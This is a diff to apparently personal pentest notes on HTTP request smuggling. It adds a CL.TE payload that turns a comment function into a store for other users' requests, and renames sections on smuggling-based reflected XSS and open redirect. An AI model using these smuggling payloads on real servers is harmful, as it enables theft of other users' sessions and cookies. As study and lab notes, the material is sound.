@@ -204,6 +204,8 @@ Host: vulnerable-website.com
 
 ### <mark style="color:yellow;">Revealing front-end request rewriting</mark> <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>
 
+<mark style="color:yellow;">**CL.TE**</mark>
+
 Find a request that reflects the value
 
 ```http
@@ -253,9 +255,29 @@ x-nr-external-service: external
 
 ### <mark style="color:yellow;">Capturing other users' requests</mark> <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>
 
-to do
+<mark style="color:yellow;">**CL.TE**</mark>
 
-### <mark style="color:yellow;">Using HTTP request smuggling to exploit reflected XSS</mark>
+Smuggle a request that submits data to the storage function, with the parameter containing the data to store positioned last in the request.
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 198
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=dL3MaAvRhsnHdriaFnPxSdvXdt3jx6B1
+Content-Length: 650
+
+csrf=ihmEx8D&postId=1&name=test&email=test@test.test&comment=
+```
+
+### <mark style="color:yellow;">Exploit reflected XSS</mark>
+
+<mark style="color:yellow;">**CL.TE**</mark>
 
 You can use a request smuggling attack to target other users of the application. This method is better than standard reflected XSS because it doesn't require victim interaction and can exploit XSS in areas like HTTP headers, which are not possible to control in typical attacks.
 
@@ -278,7 +300,9 @@ x=1
 
 The next user's request is appended to the smuggled one, delivering the XSS payload in their response.
 
-### <mark style="color:yellow;">Turn an on-site redirect into an open redirect</mark> <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>
+### <mark style="color:yellow;">Open redirect</mark> <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>
+
+<mark style="color:yellow;">**CL.TE**</mark>
 
 ```http
 GET /home HTTP/1.1
